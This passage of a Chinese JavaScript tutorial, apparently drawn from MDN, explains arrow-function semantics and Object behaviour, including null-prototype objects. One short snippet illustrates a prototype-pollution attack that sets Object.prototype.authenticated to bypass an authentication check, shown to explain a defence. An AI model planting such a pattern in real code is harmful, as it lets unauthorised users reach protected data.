<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">i</span>: <span class="number">10</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">i</span>, <span class="variable language_">this</span>),</span><br><span class="line">  <span class="attr">c</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">i</span>, <span class="variable language_">this</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">obj.<span class="title function_">b</span>();</span><br><span class="line"><span class="comment">// undefined, Window&#123;...&#125;</span></span><br><span class="line">obj.<span class="title function_">c</span>();</span><br><span class="line"><span class="comment">// 10, Object &#123;...&#125;</span></span><br></pre></td></tr></table></figure>

<p>箭头函数没有定义 this 绑定。另一个涉及<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty"><code>Object.defineProperty()</code></a>的示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">10</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&quot;b&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">get</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">a</span>, <span class="keyword">typeof</span> <span class="variable language_">this</span>.<span class="property">a</span>, <span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">a</span> + <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 代表全局对象 &#x27;Window&#x27;, 因此 &#x27;this.a&#x27; 返回 &#x27;undefined&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.<span class="property">b</span>; <span class="comment">// undefined   &quot;undefined&quot;   Window &#123;postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, frames: Window, …&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-new-操作符"><a href="#使用-new-操作符" class="headerlink" title="使用 new 操作符"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E4%BD%BF%E7%94%A8_new_%E6%93%8D%E4%BD%9C%E7%AC%A6">使用 <code>new</code> 操作符</a></h3><p>箭头函数不能用作构造器，和 <code>new</code>一起用会抛出错误。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">Foo</span> = (<span class="params"></span>) =&gt; &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>(); <span class="comment">// TypeError: Foo is not a constructor</span></span><br></pre></td></tr></table></figure>

<h3 id="使用prototype属性"><a href="#使用prototype属性" class="headerlink" title="使用prototype属性"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E4%BD%BF%E7%94%A8prototype%E5%B1%9E%E6%80%A7">使用<code>prototype</code>属性</a></h3><p>箭头函数没有<code>prototype</code>属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">Foo</span> = (<span class="params"></span>) =&gt; &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-yield-关键字"><a href="#使用-yield-关键字" class="headerlink" title="使用 yield 关键字"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E4%BD%BF%E7%94%A8_yield_%E5%85%B3%E9%94%AE%E5%AD%97">使用 <code>yield</code> 关键字</a></h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/yield"><code>yield</code></a> 关键字通常不能在箭头函数中使用（除非是嵌套在允许使用的函数内）。因此，箭头函数不能用作函数生成器。</p>
<h2 id="函数体"><a href="#函数体" class="headerlink" title="函数体"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E5%87%BD%E6%95%B0%E4%BD%93">函数体</a></h2><p>箭头函数可以有一个“简写体”或常见的“块体”。</p>
<p>在一个简写体中，只需要一个表达式，并附加一个隐式的返回值。在块体中，必须使用明确的<code>return</code>语句。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params">x</span>) =&gt; x * x;</span><br><span class="line"><span class="comment">// 简写函数 省略 return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params">x, y</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//常规编写 明确的返回值</span></span><br></pre></td></tr></table></figure>

<h2 id="返回对象字面量"><a href="#返回对象字面量" class="headerlink" title="返回对象字面量"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E8%BF%94%E5%9B%9E%E5%AF%B9%E8%B1%A1%E5%AD%97%E9%9D%A2%E9%87%8F">返回对象字面量</a></h2><p>记住用<code>params =&gt; &#123;object:literal&#125;</code>这种简单的语法返回对象字面量是行不通的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params"></span>) =&gt; &#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="comment">// Calling func() returns undefined!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params"></span>) =&gt; &#123; <span class="attr">foo</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125; &#125;;</span><br><span class="line"><span class="comment">// SyntaxError: function statement requires a name</span></span><br></pre></td></tr></table></figure>

<p>这是因为花括号（<code>&#123;&#125;</code> ）里面的代码被解析为一系列语句（即 <code>foo</code> 被认为是一个标签，而非对象字面量的组成部分）。</p>
<p>所以，记得用圆括号把对象字面量包起来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var func = () =&gt; (&#123; foo: 1 &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E6%8D%A2%E8%A1%8C">换行</a></h2><p>箭头函数在参数和箭头之间不能换行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var func = ()</span><br><span class="line">           =&gt; 1;</span><br><span class="line">// SyntaxError: expected expression, got &#x27;=&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>但是，可以通过在‘&#x3D;&gt;’之后换行，或者用‘( )’、’{ }’来实现换行，如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params">a, b, c</span>) =&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params">a, b, c</span>) =&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params">a, b, c</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">func</span> = (<span class="params">a, b, c</span>) =&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不会有语法错误</span></span><br></pre></td></tr></table></figure>

<h2 id="解析顺序"><a href="#解析顺序" class="headerlink" title="解析顺序"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions#%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F">解析顺序</a></h2><p>虽然箭头函数中的箭头不是运算符，但箭头函数具有与常规函数不同的特殊<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_precedence">运算符优先级</a>解析规则。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> callback;</span><br><span class="line"></span><br><span class="line">callback = callback || <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;; <span class="comment">// ok</span></span><br><span class="line"></span><br><span class="line">callback = callback || <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="comment">// SyntaxError: invalid arrow-function arguments</span></span><br><span class="line"></span><br><span class="line">callback = callback || (<span class="function">() =&gt;</span> &#123;&#125;);    <span class="comment">// ok</span></span><br></pre></td></tr></table></figure>

<p>更多相关内容请前往 MDN 进行查阅和学习。</p>
<h3 id="Object（对象）"><a href="#Object（对象）" class="headerlink" title="Object（对象）"></a>Object（对象）</h3><p><strong><code>Object</code></strong> 是 JavaScript 的一种<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures">数据类型</a>。它用于存储各种键值集合和更复杂的实体。可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/Object"><code>Object()</code></a> 构造函数或者使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Object_initializer">对象字面量</a>的方式创建对象。</p>
<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E6%8F%8F%E8%BF%B0">描述</a></h2><p>在 JavaScript 中，几乎所有的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures#object">对象</a>都是 <code>Object</code> 的实例；一个典型的对象从 <code>Object.prototype</code> 继承属性（包括方法），尽管这些属性可能被覆盖（或者说重写）。唯一不从 <code>Object.prototype</code> 继承的对象是那些 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#null_%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1"><code>null</code> 原型对象</a>，或者是从其他 <code>null</code> 原型对象继承而来的对象。</p>
<p>通过原型链，<strong>所有</strong>对象都能观察到 <code>Object.prototype</code> 对象的改变，除非这些改变所涉及的属性和方法沿着原型链被进一步重写。尽管有潜在的危险，但这为覆盖或扩展对象的行为提供了一个非常强大的机制。为了使其更加安全，<code>Object.prototype</code> 是核心 JavaScript 语言中唯一具有<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf#%E6%8F%8F%E8%BF%B0">不可变原型</a>的对象——<code>Object.prototype</code> 的原型始终为 <code>null</code> 且不可更改。</p>
<h3 id="对象原型属性"><a href="#对象原型属性" class="headerlink" title="对象原型属性"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E5%AF%B9%E8%B1%A1%E5%8E%9F%E5%9E%8B%E5%B1%9E%E6%80%A7">对象原型属性</a></h3><p>你应该避免调用任何 <code>Object.prototype</code> 方法，特别是那些不打算多态化的方法（即只有其初始行为是合理的，且无法被任何继承的对象以合理的方式重写）。所有从 <code>Object.prototype</code> 继承的对象都可以自定义一个具有相同名称但语义可能与你的预期完全不同的自有属性。此外，这些属性不会被 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#null_%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1"><code>null</code> 原型对象</a>继承。现代 JavaScript 中用于操作对象的工具方法都是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95">静态的</a>。更具体地说：</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf"><code>valueOf()</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString"><code>toString()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toLocaleString"><code>toLocaleString()</code></a> 存在的目的是为了多态化，你应该期望对象会定义自己的实现并具有合理的行为，因此你可以将它们作为实例方法调用。但是，<code>valueOf()</code> 和 <code>toString()</code> 通常是通过<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures#%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">强制类型转换</a>隐式调用的，因此你不需要在代码中自己调用它们。</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineGetter__"><code>__defineGetter__()</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__"><code>__defineSetter__()</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__lookupGetter__"><code>__lookupGetter__()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/__lookupSetter__"><code>__lookupSetter__()</code></a> 已被弃用，不应该再使用。请使用静态方法 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty"><code>Object.defineProperty()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor"><code>Object.getOwnPropertyDescriptor()</code></a> 作为替代。</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto"><code>__proto__</code></a> 属性已被弃用，不应该再使用。请使用静态方法 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf"><code>Object.getPrototypeOf()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf"><code>Object.setPrototypeOf()</code></a> 作为替代。</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/propertyIsEnumerable"><code>propertyIsEnumerable()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwnProperty"><code>hasOwnProperty()</code></a> 方法可以分别用静态方法 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor"><code>Object.getOwnPropertyDescriptor()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn"><code>Object.hasOwn()</code></a> 替换。</li>
<li>如果你正在检查一个构造函数的 <code>prototype</code> 属性，通常可以用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof"><code>instanceof</code></a> 代替 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isPrototypeOf"><code>isPrototypeOf()</code></a> 方法。</li>
</ul>
<p>如果不存在语义上等价的静态方法，或者你真的想使用 <code>Object.prototype</code> 方法，你应该通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/call"><code>call()</code></a> 直接在目标对象上调用 <code>Object.prototype</code> 方法，以防止因目标对象上原有方法被重写而产生意外的结果。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="comment">// 如果可能的话，你不应该在自己的对象上定义这样的方法，</span></span><br><span class="line">  <span class="comment">// 但是如果你从外部输入接收对象，可能无法防止这种情况的发生</span></span><br><span class="line">  <span class="title function_">propertyIsEnumerable</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">propertyIsEnumerable</span>(<span class="string">&quot;foo&quot;</span>); <span class="comment">// false；预期外的结果</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">propertyIsEnumerable</span>.<span class="title function_">call</span>(obj, <span class="string">&quot;foo&quot;</span>); <span class="comment">// true；预期的结果</span></span><br></pre></td></tr></table></figure>

<h3 id="从对象中删除属性"><a href="#从对象中删除属性" class="headerlink" title="从对象中删除属性"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E4%BB%8E%E5%AF%B9%E8%B1%A1%E4%B8%AD%E5%88%A0%E9%99%A4%E5%B1%9E%E6%80%A7">从对象中删除属性</a></h3><p>一个对象本身没有任何方法可以（像 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Map/delete"><code>Map.prototype.delete()</code></a> 一样）删除自己的属性。要删除一个对象的属性，必须使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/delete">delete 运算符</a>。</p>
<h3 id="null-原型对象"><a href="#null-原型对象" class="headerlink" title="null 原型对象"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#null_%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1">null 原型对象</a></h3><p>几乎所有的 JavaScript 对象最终都继承自 <code>Object.prototype</code>（参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承和原型链</a>）。然而，你可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create"><code>Object.create(null)</code></a> 或定义了 <code>__proto__: null</code> 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Object_initializer">对象字面量语法</a>（注意：对象字面量中的 <code>__proto__</code> 键不同于已弃用的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto"><code>Object.prototype.__proto__</code></a> 属性）来创建 <code>null</code> 原型对象。你还可以通过调用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf"><code>Object.setPrototypeOf(obj, null)</code></a> 将现有对象的原型更改为 <code>null</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const obj = Object.create(null);</span><br><span class="line">const obj2 = &#123; __proto__: null &#125;;</span><br></pre></td></tr></table></figure>

<p><code>null</code> 原型对象可能会有一些预期外的行为表现，因为它不会从 <code>Object.prototype</code> 继承任何对象方法。这在调试时尤其需要注意，因为常见的对象属性转换&#x2F;检测实用方法可能会产生错误或丢失信息（特别是在使用了忽略错误的静默错误捕获机制的情况下）。</p>
<p>例如，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString"><code>Object.prototype.toString()</code></a> 方法的缺失通常会使得调试变得困难：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> normalObj = &#123;&#125;; <span class="comment">// 创建一个普通对象</span></span><br><span class="line"><span class="keyword">const</span> nullProtoObj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>); <span class="comment">// 创建一个 &quot;null&quot; 原型对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`normalObj 是：<span class="subst">$&#123;normalObj&#125;</span>`</span>); <span class="comment">// 显示 &quot;normalObj 是：[object Object]&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`nullProtoObj 是：<span class="subst">$&#123;nullProtoObj&#125;</span>`</span>); <span class="comment">// 抛出错误：Cannot convert object to primitive value</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(normalObj); <span class="comment">// 显示 [object Object]</span></span><br><span class="line"><span class="title function_">alert</span>(nullProtoObj); <span class="comment">// 抛出错误：Cannot convert object to primitive value</span></span><br></pre></td></tr></table></figure>

<p>其他方法也会失败。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">normalObj.<span class="title function_">valueOf</span>(); <span class="comment">// 显示 &#123;&#125;</span></span><br><span class="line">nullProtoObj.<span class="title function_">valueOf</span>(); <span class="comment">// 抛出错误：nullProtoObj.valueOf is not a function</span></span><br><span class="line"></span><br><span class="line">normalObj.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;p&quot;</span>); <span class="comment">// 显示 &quot;true&quot;</span></span><br><span class="line">nullProtoObj.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;p&quot;</span>); <span class="comment">// 抛出错误：nullProtoObj.hasOwnProperty is not a function</span></span><br><span class="line"></span><br><span class="line">normalObj.<span class="property">constructor</span>; <span class="comment">// 显示 &quot;Object() &#123; [native code] &#125;&quot;</span></span><br><span class="line">nullProtoObj.<span class="property">constructor</span>; <span class="comment">// 显示 &quot;undefined&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过为 <code>null</code> 原型对象分配属性的方式将 <code>toString</code> 方法添加回去：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">nullProtoObj.<span class="property">toString</span> = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>; <span class="comment">// 由于新对象缺少 `toString` 方法，因此需要将原始的通用 `toString` 方法添加回来。</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nullProtoObj.<span class="title function_">toString</span>()); <span class="comment">// 显示 &quot;[object Object]&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`nullProtoObj 是：<span class="subst">$&#123;nullProtoObj&#125;</span>`</span>); <span class="comment">// 显示 &quot;nullProtoObj 是：[object Object]&quot;</span></span><br></pre></td></tr></table></figure>

<p>普通对象的 <code>toString()</code> 方法是在对象的原型上的，而与普通对象不同的是，这里的 <code>toString()</code> 方法是 <code>nullProtoObj</code> 的自有属性。这是因为 <code>nullProtoObj</code> 没有原型（即为 <code>null</code>）。</p>
<p>在实践中，<code>null</code> 原型对象通常被用作 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Map">map</a> 的简单替代品。由于存在 <code>Object.prototype</code> 属性，会导致一些错误：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ages = &#123; <span class="attr">alice</span>: <span class="number">18</span>, <span class="attr">bob</span>: <span class="number">27</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hasPerson</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> name <span class="keyword">in</span> ages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAge</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> ages[name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">hasPerson</span>(<span class="string">&quot;hasOwnProperty&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="title function_">getAge</span>(<span class="string">&quot;toString&quot;</span>); <span class="comment">// [Function: toString]</span></span><br></pre></td></tr></table></figure>

<p>使用一个 <code>null</code> 原型对象可以消除这种风险，同时不会令 <code>hasPerson</code> 和 <code>getAge</code> 函数变得复杂：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ages = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">  <span class="attr">alice</span>: &#123; <span class="attr">value</span>: <span class="number">18</span>, <span class="attr">enumerable</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">  <span class="attr">bob</span>: &#123; <span class="attr">value</span>: <span class="number">27</span>, <span class="attr">enumerable</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">hasPerson</span>(<span class="string">&quot;hasOwnProperty&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="title function_">getAge</span>(<span class="string">&quot;toString&quot;</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>在这种情况下，添加任何方法都应该慎重，因为它们可能会与存储为数据的其他键值对混淆。</p>
<p>让你的对象不继承自 <code>Object.prototype</code> 还可以防止原型污染攻击。如果恶意脚本向 <code>Object.prototype</code> 添加一个属性，程序中的每个对象上都可访问它，除了那些原型为 <code>null</code> 的对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 恶意脚本：</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">authenticated</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 意外允许未经身份验证的用户通过</span></span><br><span class="line"><span class="keyword">if</span> (user.<span class="property">authenticated</span>) &#123;</span><br><span class="line">  <span class="comment">// 访问机密数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JavaScript 还具有内置的 API，用于生成 <code>null</code> 原型对象，特别是那些将对象用作临时键值对集合的 API。例如：</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/groupBy"><code>Object.groupBy()</code></a> 方法的返回值</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec"><code>RegExp.prototype.exec()</code></a> 方法返回结果中的 <code>groups</code> 和 <code>indices.groups</code> 属性</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/@@unscopables"><code>Array.prototype[@@unscopables]</code></a> 属性（所有 <code>@@unscopables</code> 对象原型都应该为 <code>null</code>）</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/import.meta"><code>import.meta</code></a> 对象</li>
<li>通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/import#%E5%AF%BC%E5%85%A5%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><code>import * as ns from &quot;module&quot;</code></a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import"><code>import()</code> (en-US)</a> 获取的模块命名空间对象</li>
</ul>
<p>“<code>null</code> 原型对象”这个术语通常也包括其原型链中没有 <code>Object.prototype</code> 的任何对象。当使用类时，可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/extends#%E6%89%A9%E5%B1%95_null"><code>extends null</code></a> 来创建这样的对象。</p>
<h3 id="对象强制转换"><a href="#对象强制转换" class="headerlink" title="对象强制转换"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object#%E5%AF%B9%E8%B1%A1%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2">对象强制转换</a></h3><p>许多内置操作首先将它们的参数强制转换为对象。<a href="https://tc39.es/ecma262/#sec-toobject">该过程</a>可以概括如下：</p>
<ul>
<li>对象则按原样返回。</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined"><code>undefined</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/null"><code>null</code></a> 则抛出 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError"><code>TypeError</code></a>。</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Number"><code>Number</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String"><code>String</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean"><code>Boolean</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol"><code>Symbol</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/BigInt"><code>BigInt</code></a> 等基本类型被封装成其对应的基本类型对象。</li>
</ul>
<p>在 JavaScript 中实现相同效果的最佳方式是使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/Object"><code>Object()</code></a> 构造函数。<code>Object(x)</code> 可以将 <code>x</code> 转换为对象，对于 <code>undefined</code> 或 <code>null</code>，它会返回一个普通对象而不是抛出 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError"><code>TypeError</code></a> 异常。</p>
